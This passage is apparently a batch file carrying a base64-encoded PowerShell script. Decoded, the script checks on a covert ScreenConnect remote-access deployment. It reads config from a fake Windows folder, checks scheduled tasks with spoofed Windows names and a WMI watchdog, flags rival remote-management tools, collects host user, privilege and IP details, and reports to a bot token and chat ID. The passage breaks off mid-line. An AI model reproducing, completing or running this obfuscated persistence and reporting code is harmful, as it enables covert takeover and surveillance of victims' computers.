::ZScsICdMYWJUZWNoJywNCiAgICAgICAgJ0FjdGlvbjEnLCAnU2ltcGxlSGVscCcs
::ICdCb21nYXInLCAnQmV5b25kVHJ1c3QnLCAnTWVzaEFnZW50JywgJ01lc2ggQ2Vu
::dHJhbCcsICdNZXNoIEFnZW50JywNCiAgICAgICAgJ1RhY3RpY2FsUk1NJywgJ3Rh
::Y3RpY2Fscm1tJywgJ0dldFNjcmVlbicsICdTdXByZW1vJywgJ3J1dHNlcnYnLCAn
::cmVtb3RpbmdfaG9zdCcsDQogICAgICAgICdDaHJvbWUgUmVtb3RlIERlc2t0b3An
::LCAnUGFyc2VjJywgJ05ldFN1cHBvcnQnLCAnTGV2ZWwuaW8nLCAnTGV2ZWwgQWdl
::bnQnLA0KICAgICAgICAnQ29udGludXVtJywgJ1NBQVonLCAnTmF2ZXJpc2snLCAn
::SW1teUJvdCcsICdBdXRvbW94JywgJ2FtYWdlbnQnLCAnQWNyb25pcyBDeWJlcics
::ICdEb21vdHonLCAnQXV2aWsnLA0KICAgICAgICAnQmFycmFjdWRhIFJNTScsICdN
::YW5hZ2VkIFdvcmtwbGFjZScsICdHb3ZlcmxhbicsICdQRFEgRGVwbG95JywgJ1BE
::USBJbnZlbnRvcnknLCAnUERRIENvbm5lY3QnLA0KICAgICAgICAnTi1hYmxlJywg
::J04tY2VudHJhbCcsICdOLXNpZ2h0JywgJ1Rha2UgQ29udHJvbCcsICdBZHZhbmNl
::ZCBNb25pdG9yaW5nIEFnZW50JywgJ1VsdHJhVmlld2VyJywgJ0Flcm9BZG1pbics
::DQogICAgICAgICdMaXRlTWFuYWdlcicsICdSYWRtaW4nLCAnTm9NYWNoaW5lJywg
::J0lwZXJpdXMnLCAnSVNMIExpZ2h0JywgJ0FtbXl5JywgJ1RpZ2h0Vk5DJywgJ1Vs
::dHJhVk5DJywgJ1JlYWxWTkMnDQogICAgKQ0KICAgICRrZWVwVG9rZW5zID0gQCgn
::RGF0dG8nLCAnQ2VudHJhU3RhZ2UnLCAnQ2FnU2VydmljZScsICdBdXRvdGFza0Vu
::ZHBvaW50JykNCiAgICAkaGl0cyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rp
::b25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQogICAgJHNlZW4gPSBAe30NCg0KICAg
::IGZ1bmN0aW9uIEFkZC1IaXQoW3N0cmluZ10ka2luZCwgW3N0cmluZ10kbmFtZSkg
::ew0KICAgICAgICAka2V5ID0gIiRraW5kfCRuYW1lIi5Ub0xvd2VySW52YXJpYW50
::KCkNCiAgICAgICAgaWYgKCRzZWVuLkNvbnRhaW5zS2V5KCRrZXkpKSB7IHJldHVy
::biB9DQogICAgICAgICRzZWVuWyRrZXldID0gJHRydWUNCiAgICAgICAgW3ZvaWRd
::JGhpdHMuQWRkKCgnLSBbezB9XSA8Y29kZT57MX08L2NvZGU+JyAtZiAka2luZCwg
::KEVzYyAkbmFtZSkpKQ0KICAgIH0NCiAgICBmdW5jdGlvbiBUZXN0LUtlZXBOYW1l
::KFtzdHJpbmddJHMpIHsNCiAgICAgICAgaWYgKC1ub3QgJHMpIHsgcmV0dXJuICRm
::YWxzZSB9DQogICAgICAgIGlmICgkcyAtbGlrZSAnKlNjcmVlbkNvbm5lY3QqJykg
::eyByZXR1cm4gJHRydWUgfQ0KICAgICAgICBmb3JlYWNoICgkayBpbiAka2VlcFRv
::a2VucykgeyBpZiAoJHMgLWxpa2UgIiokayoiKSB7IHJldHVybiAkdHJ1ZSB9IH0N
::CiAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgIH0NCg0KICAgIEdldC1TZXJ2aWNl
::IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qg
::ew0KICAgICAgICAkbiA9ICRfLk5hbWUNCiAgICAgICAgJGQgPSAkXy5EaXNwbGF5
::TmFtZQ0KICAgICAgICBpZiAoVGVzdC1LZWVwTmFtZSAkbiAtb3IgVGVzdC1LZWVw
::TmFtZSAkZCkgew0KICAgICAgICAgICAgaWYgKCRuIC1saWtlICcqQ2VudHJhU3Rh
::Z2UqJyAtb3IgJGQgLWxpa2UgJypEYXR0byonIC1vciAkbiAtbGlrZSAnKkNhZ1Nl
::cnZpY2UqJykgew0KICAgICAgICAgICAgICAgIEFkZC1IaXQgJ2tlZXAtZGF0dG8n
::ICgiJG4gKCQoJF8uU3RhdHVzKSkiKQ0KICAgICAgICAgICAgfQ0KICAgICAgICAg
::ICAgcmV0dXJuDQogICAgICAgIH0NCiAgICAgICAgZm9yZWFjaCAoJHQgaW4gJHRv
::a2Vucykgew0KICAgICAgICAgICAgaWYgKCRuIC1saWtlICIqJHQqIiAtb3IgJGQg
::LWxpa2UgIiokdCoiKSB7DQogICAgICAgICAgICAgICAgQWRkLUhpdCAnc3ZjJyAo
::IiRuICgkKCRfLlN0YXR1cykpIikNCiAgICAgICAgICAgICAgICBicmVhaw0KICAg
::ICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgR2V0LVByb2Nlc3Mg
::LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7
::DQogICAgICAgICRuID0gJF8uUHJvY2Vzc05hbWUNCiAgICAgICAgaWYgKFRlc3Qt
::S2VlcE5hbWUgJG4pIHsgcmV0dXJuIH0NCiAgICAgICAgZm9yZWFjaCAoJHQgaW4g
::JHRva2Vucykgew0KICAgICAgICAgICAgaWYgKCRuIC1saWtlICIqJHQqIikgew0K
::ICAgICAgICAgICAgICAgIEFkZC1IaXQgJ3Byb2MnICRuDQogICAgICAgICAgICAg
::ICAgYnJlYWsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAg
::ICR1bmluc3QgPSBAKA0KICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0
::XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXConLA0KICAgICAgICAn
::SEtMTTpcU09GVFdBUkVcV09XNjQzMk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3Vy
::cmVudFZlcnNpb25cVW5pbnN0YWxsXConDQogICAgKQ0KICAgIGZvcmVhY2ggKCRw
::YXRoIGluICR1bmluc3QpIHsNCiAgICAgICAgR2V0LUl0ZW1Qcm9wZXJ0eSAkcGF0
::aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0
::IHsNCiAgICAgICAgICAgICRkbiA9ICRfLkRpc3BsYXlOYW1lDQogICAgICAgICAg
::ICBpZiAoLW5vdCAkZG4pIHsgcmV0dXJuIH0NCiAgICAgICAgICAgIGlmIChUZXN0
::LUtlZXBOYW1lICRkbikgew0KICAgICAgICAgICAgICAgIGlmICgkZG4gLWxpa2Ug
::JypEYXR0byonIC1vciAkZG4gLWxpa2UgJypDZW50cmFTdGFnZSonKSB7IEFkZC1I
::aXQgJ2tlZXAtZGF0dG8nICRkbiB9DQogICAgICAgICAgICAgICAgcmV0dXJuDQog
::ICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoJGRuIC1saWtlICdTY3JlZW5D
::b25uZWN0KicpIHsgcmV0dXJuIH0NCiAgICAgICAgICAgIGZvcmVhY2ggKCR0IGlu
::ICR0b2tlbnMpIHsNCiAgICAgICAgICAgICAgICBpZiAoJGRuIC1saWtlICIqJHQq
::Iikgew0KICAgICAgICAgICAgICAgICAgICBBZGQtSGl0ICdtc2knICRkbg0KICAg
::ICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIH0NCiAgICAg
::ICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHJldHVybiAkaGl0cw0K
::fQ0KDQpmdW5jdGlvbiBHZXQtR3J5eGFLZWVwRnAgew0KICAgICRmcCA9ICc5OTA4
::MTk4ZTY2OGU0NzUwJw0KICAgICRwID0gJ0M6XFByb2dyYW1EYXRhXE1pY3Jvc29m
::dFxXaW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlXGdyeXhhLmNmZycNCiAgICBpZiAo
::JFdvcmtEaXIpIHsgJHAgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2dyeXhhLmNmZycg
::fQ0KICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRwKSB7DQogICAgICAg
::IEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkcCAtRXJyb3JBY3Rpb24gU2lsZW50
::bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgIGlmICgk
::XyAtbWF0Y2ggJ15DVVJSRU5UX0ZQPShbMC05YS1mQS1GXXsxNn0pXHMqJCcpIHsg
::JGZwID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigpIH0NCiAgICAgICAgfQ0KICAgIH0N
::CiAgICByZXR1cm4gJGZwDQp9DQoNCmZ1bmN0aW9uIEdldC1TY0luc3RhbGxzIHsN
::CiAgICAkZ3J5eGFGcCA9IEdldC1Hcnl4YUtlZXBGcA0KICAgICRsaXN0ID0gTmV3
::LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W3N0cmluZ10N
::CiAgICBHZXQtU2VydmljZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8
::IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgJ1NjcmVlbkNvbm5lY3QgQ2xp
::ZW50KicgfSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgJGZwID0gaWYgKCRf
::Lk5hbWUgLW1hdGNoICdcKChbMC05YS1mXXsxNn0pXCknKSB7ICRtYXRjaGVzWzFd
::IH0gZWxzZSB7ICc/JyB9DQogICAgICAgICR0YWcgPSBpZiAoJGZwIC1lcSAnNWY2
::MDEwNTc5ODUyZTUwNycpIHsgJ0tFRVAtU0VWUlonIH0NCiAgICAgICAgZWxzZWlm
::ICgkZnAgLWVxICdmODYxYzgxNDBkNDUzNDI3JykgeyAnS0VFUC1BTFQnIH0NCiAg
::ICAgICAgZWxzZWlmICgkZnAgLWVxICRncnl4YUZwKSB7ICdLRUVQLUdSWVhBJyB9
::DQogICAgICAgIGVsc2UgeyAnRk9SRUlHTicgfQ0KICAgICAgICBbdm9pZF0kbGlz
::dC5BZGQoKCctIDxjb2RlPnswfTwvY29kZT46IDxiPnsxfTwvYj4gW3syfV0nIC1m
::IChFc2MgJF8uTmFtZSksIChFc2MgKFtzdHJpbmddJF8uU3RhdHVzKSksICR0YWcp
::KQ0KICAgIH0NCg0KICAgICRyb290cyA9IEAoDQogICAgICAgICIke2VudjpQcm9n
::cmFtRmlsZXN9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIsDQogICAgICAgICIke2Vu
::djpQcm9ncmFtRmlsZXMoeDg2KX1cU2NyZWVuQ29ubmVjdCBDbGllbnQqIg0KICAg
::ICkNCiAgICBmb3JlYWNoICgkcGF0IGluICRyb290cykgew0KICAgICAgICBHZXQt
::Q2hpbGRJdGVtIC1QYXRoICRwYXQgLURpcmVjdG9yeSAtRXJyb3JBY3Rpb24gU2ls
::ZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgIFt2
::b2lkXSRsaXN0LkFkZCgoJy0gcGF0aDogPGNvZGU+ezB9PC9jb2RlPicgLWYgKEVz
::YyAkXy5GdWxsTmFtZSkpKQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgJHVuaW5z
::dCA9IEAoDQogICAgICAgICdIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93
::c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicsDQogICAgICAgICdIS0xNOlxT
::T0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVy
::c2lvblxVbmluc3RhbGxcKicNCiAgICApDQogICAgZm9yZWFjaCAoJHBhdGggaW4g
::JHVuaW5zdCkgew0KICAgICAgICBHZXQtSXRlbVByb3BlcnR5ICRwYXRoIC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsNCiAgICAg
::ICAgICAgICRfLkRpc3BsYXlOYW1lIC1saWtlICcqU2NyZWVuQ29ubmVjdConDQog
::ICAgICAgIH0gfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAkdmVyID0g
::aWYgKCRfLkRpc3BsYXlWZXJzaW9uKSB7ICRfLkRpc3BsYXlWZXJzaW9uIH0gZWxz
::ZSB7ICc/JyB9DQogICAgICAgICAgICBbdm9pZF0kbGlzdC5BZGQoKCctIG1zaTog
::PGNvZGU+ezB9PC9jb2RlPiB2ezF9JyAtZiAoRXNjICRfLkRpc3BsYXlOYW1lKSwg
::KEVzYyAkdmVyKSkpDQogICAgICAgIH0NCiAgICB9DQoNCiAgICBpZiAoJGxpc3Qu
::Q291bnQgLWVxIDApIHsgW3ZvaWRdJGxpc3QuQWRkKCctIChub25lKScpIH0NCiAg
::ICByZXR1cm4gJGxpc3QNCn0NCg0KJGNmZyA9IEdldC1DZmcNCmlmICgtbm90ICRj
::ZmcuQk9UX1RPS0VOIC1vciAtbm90ICRjZmcuQ0hBVF9JRCkgew0KICAgIEFkZC1D
::b250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdib290LmVy
::cicpIC1WYWx1ZSAndGdfc2tpcF9ub19jZmcnIC1FcnJvckFjdGlvbiBTaWxlbnRs
::eUNvbnRpbnVlDQogICAgZXhpdCAyDQp9DQoNCiRwcmltID0gJ1NjcmVlbkNvbm5l
::Y3QgQ2xpZW50ICg1ZjYwMTA1Nzk4NTJlNTA3KScNCiRhbHQgPSAnU2NyZWVuQ29u
::bmVjdCBDbGllbnQgKGY4NjFjODE0MGQ0NTM0MjcpJw0KJG9zID0gR2V0LU9zSW5m
::bw0KJHdobyA9IFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6
::R2V0Q3VycmVudCgpLk5hbWUNCiRlbGV2ID0gKFtTZWN1cml0eS5QcmluY2lwYWwu
::V2luZG93c1ByaW5jaXBhbF1bU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVu
::dGl0eV06OkdldEN1cnJlbnQoKSkuSXNJblJvbGUoDQogICAgW1NlY3VyaXR5LlBy
::aW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKQ0KJGlz
::U3lzdGVtID0gJHdobyAtbGlrZSAnKlNZU1RFTSonIC1vciAkd2hvIC1lcSAnTlQg
::QVVUSE9SSVRZXFNZU1RFTScNCg0KJG1zaUNhY2hlID0gSm9pbi1QYXRoICRXb3Jr
::RGlyICdwa2cubXNpJw0KJG1zaVNpemUgPSBpZiAoVGVzdC1QYXRoICRtc2lDYWNo
::ZSkgew0KICAgICd7MDpOMH0gS0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlIC1G
::b3JjZSkuTGVuZ3RoIC8gMUtCKQ0KfSBlbHNlIHsgJ25vbmUnIH0NCg0KJG1vblBh
::dGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ293bl9tb24uY21kJw0KJGV0bE1vbiA9
::ICIkZW52OlByb2dyYW1EYXRhXE1pY3Jvc29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0
::bGNhY2hlXGV0bF9tb24uY21kIg0KJGhhc01vbiA9IFRlc3QtUGF0aCAkbW9uUGF0
::aA0KJGhhc0V0bCA9IFRlc3QtUGF0aCAkZXRsTW9uDQoNCiMgVDEwOiBvbi1kaXNr
::IHBheWxvYWQgYnVpbGQgbWFya2VycyAtPiBldmVyeSByZXBvcnQgcHJvdmVzIGV4
::YWN0bHkgd2hhdCBpcyBpbnN0YWxsZWQNCmZ1bmN0aW9uIEdldC1QYXlsb2FkQnVp
::bGQoW3N0cmluZ10kZmlsZSkgew0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJGZp
::bGUpKSB7IHJldHVybiAnbWlzc2luZycgfQ0KICAgIGZvcmVhY2ggKCRsIGluIChH
::ZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGZpbGUgLVRvdGFsQ291bnQgOCAtRm9y
::Y2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7DQogICAgICAgIGlm
::ICgkbCAtbWF0Y2ggJ0JVSUxEXHMrXGR7OH0oW0EtWl0rXGQrKScpIHsgcmV0dXJu
::ICRtYXRjaGVzWzFdIH0NCiAgICB9DQogICAgcmV0dXJuICc/Jw0KfQ0KJGJNb24g
::PSBHZXQtUGF5bG9hZEJ1aWxkIChKb2luLVBhdGggJFdvcmtEaXIgJ293bl9tb24u
::Y21kJykNCiRiU2VjID0gR2V0LVBheWxvYWRCdWlsZCAoSm9pbi1QYXRoICRXb3Jr
::RGlyICdvd25fc2VjdXJlLmNtZCcpDQokYlRnciA9IEdldC1QYXlsb2FkQnVpbGQg
::KEpvaW4tUGF0aCAkV29ya0RpciAndGdfcmVwb3J0LnBzMScpDQokYkxpYiA9IEdl
::dC1QYXlsb2FkQnVpbGQgKEpvaW4tUGF0aCAkV29ya0RpciAnb3duX2xpYi5wczEn
::KQ0KDQojIHBlci1ob3N0IGlkZW50aXR5OiBleHBlY3RlZCB0YXNrIG5hbWVzIGNv
::bWUgZnJvbSBpZGVudGl0eS5jZmcgd2hlbiBwcmVzZW50DQokaWRDZmcgPSBKb2lu
::LVBhdGggJFdvcmtEaXIgJ2lkZW50aXR5LmNmZycNCiRpZE1hcCA9IEB7fQ0KaWYg
::KFRlc3QtUGF0aCAkaWRDZmcpIHsNCiAgICBHZXQtQ29udGVudCAtTGl0ZXJhbFBh
::dGggJGlkQ2ZnIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICBpZiAoJF8gLW1h
::dGNoICdeXHMqKFtBLVpfXSspXHMqPVxzKiguKz8pXHMqJCcpIHsgJGlkTWFwWyRt
::YXRjaGVzWzFdXSA9ICRtYXRjaGVzWzJdIH0NCiAgICB9DQp9DQokZXhwZWN0ZWRU
::YXNrcyA9IEAoDQogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0EpIHsg
::JGlkTWFwLlRBU0tfQSB9IGVsc2UgeyAnV2VyUXVldWVTeW5jJyB9KTsgUm9sZSA9
::ICJ0aWNrICQoJGlkTWFwLk1PX0EpbSAoY2hhaW4xKSIgfSwNCiAgICBAeyBOYW1l
::ID0gJChpZiAoJGlkTWFwLlRBU0tfQikgeyAkaWRNYXAuVEFTS19CIH0gZWxzZSB7
::ICdQbGFTZXJ2ZXJIZWFsdGgnIH0pOyBSb2xlID0gImJhY2t1cCAkKCRpZE1hcC5N
::T19CKW0gKGNoYWluMSkiIH0sDQogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5U
::QVNLX0MpIHsgJGlkTWFwLlRBU0tfQyB9IGVsc2UgeyAnV2RpSG9zdFByb3h5JyB9
::KTsgUm9sZSA9ICdPTlNUQVJUIChjaGFpbjEpJyB9LA0KICAgIEB7IE5hbWUgPSAk
::KGlmICgkaWRNYXAuVEFTS19EKSB7ICRpZE1hcC5UQVNLX0QgfSBlbHNlIHsgJ1Rj
::cElwQ29uZmxpY3RSZXMnIH0pOyBSb2xlID0gJ09OTE9HT04gKGNoYWluMSknIH0N
::CikNCiMgY2hhaW4gMjogV01JIHdhdGNoZG9nIHN1YnNjcmlwdGlvbg0KJHdtaUMg
::PSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNs
::YXNzIENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciAtRmlsdGVyICJOYW1lPSdXdWNh
::Y2hlV2F0Y2hkb2dDJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiRl
::eHBlY3RlZFRhc2tzICs9IEB7IE5hbWUgPSAnXFdNSVxXdWNhY2hlV2F0Y2hkb2dD
::JzsgUm9sZSA9ICd0aW1lciAzbSAoY2hhaW4yKSc7IFdtaSA9ICgkbnVsbCAtbmUg
::JHdtaUMpIH0NCg0KJHRhc2tMaW5lcyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxl
::Y3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQokdGFza09rID0gMA0KJHRhc2tC
::YWQgPSAwDQpmb3JlYWNoICgkdCBpbiAkZXhwZWN0ZWRUYXNrcykgew0KICAgIGlm
::ICgkdC5Db250YWluc0tleSgnV21pJykpIHsNCiAgICAgICAgaWYgKCR0LldtaSkg
::eyAkdGFza09rKys7ICRtYXJrID0gJ09LJyB9IGVsc2UgeyAkdGFza0JhZCsrOyAk
::bWFyayA9ICdNSVNTSU5HJyB9DQogICAgICAgIFt2b2lkXSR0YXNrTGluZXMuQWRk
::KCgnLSBbezB9XSA8Y29kZT57MX08L2NvZGU+IC0gezJ9JyAtZiAkbWFyaywgKEVz
::YyAkdC5OYW1lKSwgKEVzYyAkdC5Sb2xlKSkpDQogICAgICAgIGNvbnRpbnVlDQog
::ICAgfQ0KICAgICRoID0gR2V0LVRhc2tIZWFsdGggJHQuTmFtZQ0KICAgIGlmICgk
::aC5QcmVzZW50IC1hbmQgJGguSGVhbHRoeSkgew0KICAgICAgICAkdGFza09rKysN
::CiAgICAgICAgJG1hcmsgPSAnT0snDQogICAgfSBlbHNlaWYgKCRoLlByZXNlbnQg
::LWFuZCAtbm90ICRoLk91cnMpIHsNCiAgICAgICAgJHRhc2tCYWQrKw0KICAgICAg
::ICAkbWFyayA9ICdOT1RfT1VSUycNCiAgICB9IGVsc2VpZiAoJGguUHJlc2VudCkg
::ew0KICAgICAgICAkdGFza0JhZCsrDQogICAgICAgICRtYXJrID0gJ1dFQUsnDQog
::ICAgfSBlbHNlIHsNCiAgICAgICAgJHRhc2tCYWQrKw0KICAgICAgICAkbWFyayA9
::ICdNSVNTSU5HJw0KICAgIH0NCiAgICAkZXh0cmEgPSAnJw0KICAgIGlmICgkaC5Q
::cmVzZW50KSB7DQogICAgICAgICRiaXRzID0gQCgpDQogICAgICAgIGlmICgkaC5T
::dGF0dXMpIHsgJGJpdHMgKz0gJGguU3RhdHVzIH0NCiAgICAgICAgaWYgKCRoLlJl
::c3VsdCAtbmUgJycgLWFuZCAkaC5SZXN1bHQgLW5lICcwJykgeyAkYml0cyArPSAo
::Ikxhc3RSZXN1bHQ9IiArICRoLlJlc3VsdCkgfQ0KICAgICAgICBpZiAoJGJpdHMu
::Q291bnQpIHsgJGV4dHJhID0gJyAoJyArICgkYml0cyAtam9pbiAnLCAnKSArICcp
::JyB9DQogICAgfQ0KICAgIFt2b2lkXSR0YXNrTGluZXMuQWRkKCgnLSBbezB9XSA8
::Y29kZT57MX08L2NvZGU+IC0gezJ9ezN9JyAtZiAkbWFyaywgKEVzYyAkdC5OYW1l
::KSwgKEVzYyAkdC5Sb2xlKSwgKEVzYyAkZXh0cmEpKSkNCn0NCg0KJHByaW1MaW5l
::ID0gR2V0LVN2Y0xpbmUgJHByaW0NCiRhbHRMaW5lID0gR2V0LVN2Y0xpbmUgJGFs
::dA0KJHByaW1PayA9ICRwcmltTGluZSAtbGlrZSAnUnVubmluZyonDQokZGVwbG95
::T2sgPSAkcHJpbU9rIC1hbmQgKCR0YXNrT2sgLWdlIDMpIC1hbmQgJGhhc01vbg0K
::DQokZW1vamlNYXAgPSBAew0KICAgIE9LICAgICAgID0gW3N0cmluZ10oW2NoYXJd
::MHgyNzA1KQ0KICAgIERPV04gICAgID0gKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0
::RnJvbVV0ZjMyKDB4MUY2QTgpKQ0KICAgIFJFU1RPUkVEID0gKFtzdHJpbmddW2No
::YXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY3RTIpKQ0KICAgIEZBSUwgICAgID0g
::W3N0cmluZ10oW2NoYXJdMHgyNzRDKQ0KICAgIEZPUkNFICAgID0gW3N0cmluZ10o
::W2NoYXJdMHgyNkExKQ0KICAgIERFUExPWSAgID0gKFtzdHJpbmddW2NoYXJdOjpD
::b252ZXJ0RnJvbVV0ZjMyKDB4MUY2ODApKQ0KICAgIEhCICAgICAgID0gKFtzdHJp
::bmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY0RTEpKQ0KICAgIEdEUk9Q
::ICAgID0gKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY2QTgp
::KQ0KfQ0KJGtleSA9ICRTdGF0ZS5Ub1VwcGVySW52YXJpYW50KCkNCiRlbW9qaSA9
::IGlmICgkZW1vamlNYXAuQ29udGFpbnNLZXkoJGtleSkpIHsgJGVtb2ppTWFwWyRr
::ZXldIH0gZWxzZSB7IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZyb21VdGYzMigw
::eDFGNEYxKSkgfQ0KDQokdGl0bGUgPSBzd2l0Y2ggKCRrZXkpIHsNCiAgICAnT0sn
::IHsgJ1ByaW1hcnkgaGVhbHRoeScgfQ0KICAgICdET1dOJyB7ICdQcmltYXJ5IERP
::V04gLSBoZWFsaW5nJyB9DQogICAgJ1JFU1RPUkVEJyB7ICdHcnl4YSBSRVNUT1JF
::RCcgfQ0KICAgICdGQUlMJyB7ICdIZWFsIEZBSUxFRCcgfQ0KICAgICdGT1JDRScg
::eyAnRm9yY2VkIHJlaW5zdGFsbCcgfQ0KICAgICdERVBMT1knIHsgaWYgKCRkZXBs
::b3lPaykgeyAnRklSU1QgREVQTE9ZIE9LJyB9IGVsc2UgeyAnRklSU1QgREVQTE9Z
::IC0gQ0hFQ0sgTkVFREVEJyB9IH0NCiAgICAnSEInIHsgJ2hvdXJseSBkaWdlc3Qn
::IH0NCiAgICAnR0RST1AnIHsgJ0dSWVhBIERST1AgLSBjYXVzZSByZWNvcmRlZCcg
::fQ0KICAgIGRlZmF1bHQgeyAiU3RhdGU6ICRTdGF0ZSIgfQ0KfQ0KDQokdHJhbnMg
::PSBpZiAoJE9sZFN0YXRlKSB7ICIkT2xkU3RhdGUgLT4gJFN0YXRlIiB9IGVsc2Ug
::eyAkU3RhdGUgfQ0KJHNjTGlzdCA9IEdldC1TY0luc3RhbGxzDQokcm1tSGl0cyA9
::IEdldC1SbW1IaXRzDQppZiAoJHJtbUhpdHMuQ291bnQgLWVxIDApIHsgW3ZvaWRd
::JHJtbUhpdHMuQWRkKCctIChub25lIGRldGVjdGVkKScpIH0NCg0KJHB1YiA9IEdl
::dC1QdWJsaWNJcA0KJGxhbiA9IEdldC1Mb2NhbElwcw0KJG5vdyA9IEdldC1EYXRl
::IC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06c3Mgenp6Jw0KJHVwdGltZSA9ICdu
::L2EnDQp0cnkgew0KICAgICRib290ID0gKEdldC1DaW1JbnN0YW5jZSBXaW4zMl9P
::cGVyYXRpbmdTeXN0ZW0pLkxhc3RCb290VXBUaW1lDQogICAgJHVwdGltZSA9ICd7
::MDpkZH1kIHswOmhofWggezA6bW19bScgLWYgKChHZXQtRGF0ZSkgLSAkYm9vdCkN
::Cn0gY2F0Y2gge30NCg0KIyBjYW1wYWlnbiBzdGF0ZSBmaWxlICh3cml0dGVuIGJ5
::IG93bl9saWIucHMxIHN0YXRlIGFjdGlvbikNCiRzdGF0ZUxpbmUgPSAnbi9hJw0K
::JHN0YXRlT2JqID0gJG51bGwNCiRzdGF0ZVBhdGgyID0gSm9pbi1QYXRoICRXb3Jr
::RGlyICdzdGF0ZS5qc29uJw0KaWYgKFRlc3QtUGF0aCAkc3RhdGVQYXRoMikgew0K
::ICAgICRyYXdTdGF0ZSA9IChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRl
::UGF0aDIgLVJhdykuVHJpbSgpDQogICAgdHJ5IHsNCiAgICAgICAgJHN0YXRlT2Jq
::ID0gJHJhd1N0YXRlIHwgQ29udmVydEZyb20tSnNvbg0KICAgICAgICAkZm9yZWln
::bkNzdiA9IGlmICgkc3RhdGVPYmouZm9yZWlnbikgeyAoJHN0YXRlT2JqLmZvcmVp
::Z24gLWpvaW4gJywnKSB9IGVsc2UgeyAnLScgfQ0KICAgICAgICAkc3RhdGVMaW5l
::ID0gInByaW09JCgkc3RhdGVPYmoucHJpbSkgYWx0PSQoJHN0YXRlT2JqLmFsdCkg
::Zm9yZWlnbj1bJGZvcmVpZ25Dc3ZdIHRhc2tzPSQoJHN0YXRlT2JqLnRhc2tzT2sp
::LyQoJHN0YXRlT2JqLnRhc2tzVG90YWwpIHdkPSQoJHN0YXRlT2JqLndhdGNoZG9n
::KSBoZWFscz0kKCRzdGF0ZU9iai5pbnN0YWxsQ291bnQpIg0KICAgIH0gY2F0Y2gg
::eyAkc3RhdGVMaW5lID0gJHJhd1N0YXRlIH0NCn0NCg0KJGRlcGxveUJsb2NrID0g
::JycNCmlmICgka2V5IC1lcSAnREVQTE9ZJykgew0KICAgICR2ZXJkaWN0ID0gaWYg
::KCRkZXBsb3lPaykgeyAnREVQTE9ZRUQgLyBIRUFMVEhZJyB9IGVsc2UgeyAnREVQ
::TE9ZRUQgQlVUIElOQ09NUExFVEUnIH0NCiAgICAkZm9yZWlnbiA9IEAoR2V0LUNo
::aWxkSXRlbSAtUGF0aCAiJHtlbnY6UHJvZ3JhbUZpbGVzfVxTY3JlZW5Db25uZWN0
